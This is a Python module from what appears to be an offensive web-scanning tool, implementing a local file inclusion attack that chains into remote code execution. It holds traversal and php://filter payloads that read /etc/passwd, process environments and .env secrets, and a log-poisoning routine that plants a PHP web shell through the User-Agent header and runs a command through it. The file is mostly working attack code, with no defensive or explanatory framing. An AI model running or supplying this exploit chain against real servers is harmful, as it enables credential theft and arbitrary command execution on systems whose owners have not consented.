"""lfi v4 — sniper: targeted paths + log-poison chain"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.sniper import SniperProbe


# только целевые пути (10, не 1082)
TARGETED = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/www/html/.env",
]

MARKERS = [
    "root:x:0:0", "daemon:x:", "/bin/bash", "/bin/sh",
    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=", "localhost:3306",
    "APP_KEY=", "DB_PASSWORD=",
]


class Lfi:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"file": ["index"]}

        sniper = SniperProbe(session, logger)
        base = sniper.take_baseline(target, samples=3)
        if not base:
            print("[lfi] no baseline"); return {}

        print(f"[lfi] sniper mode — {len(TARGETED)} targeted payloads")
        print()

        findings = []
        vuln_param = None

        for name in params:
            print(f"[param: {name}]")
            for payload in TARGETED:
                url_fn = lambda p, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()},
                                                 name: p}, doseq=True)))

                r = sniper.probe(url_fn, payload, detect_markers=MARKERS, verify_count=2)
                if r.get("hit") and r["confidence"] >= 70:
                    print(f"  ✓ LFI: {payload[:50]}")
                    print(f"    confidence: {r['confidence']}%")
                    print(f"    evidence: {r['evidence'][:80]}")
                    findings.append({
                        "param": name, "payload": payload,
                        "marker": r["reason"], "confidence": r["confidence"],
                        "evidence": r["evidence"],
                    })
                    logger.finding("lfi", "critical",
                                   f"{name}={payload[:50]} conf={r['confidence']}%")
                    vuln_param = name
                    break
            if vuln_param:
                break

        # log-poison chain
        if vuln_param:
            print()
            print(f"[lfi] log-poison → RCE chain")
            self._log_poison(sniper, u, params, vuln_param, logger)

        print()
        print(f"[lfi] findings: {len(findings)}")
        return {"findings": findings, "stats": sniper.summary()}

    def _log_poison(self, sniper, u, params, param, logger):
        """Send PHP in UA, then include log via LFI."""
        marker = "OMNI_LFI_RCE_MARKER_7X9Z"
        php = f"<?php echo '{marker}'; system($_GET['c']); ?>"
        sniper.http.get(sniper.session.target, headers={"User-Agent": php})

        logs = ["../../../../var/log/apache2/access.log",
                "../../../../var/log/nginx/access.log",
                "../../../../var/log/httpd/access_log"]

        for log in logs:
            url = urlunparse(u._replace(query=urlencode(
                {**{k: v[0] for k, v in params.items()}, param: log}, doseq=True)))
            r = sniper.http.get(url)
            if r and (marker in r.text or php in r.text):
                print(f"  ✓ LOG POISON works: {log}")
                logger.finding("lfi_rce", "critical", f"UA reflected in {log}")

                # try command
                test_url = urlunparse(u._replace(query=urlencode(
                    {**{k: v[0] for k, v in params.items()}, param: log, "c": "id"}, doseq=True)))
                r2 = sniper.http.get(test_url)
                if r2 and "uid=" in r2.text:
                    print(f"  ✓✓ RCE CONFIRMED: id output in response")
                    logger.finding("lfi_rce_confirmed", "critical", "RCE via log poison")
                return
        print(f"  log poison not confirmed")
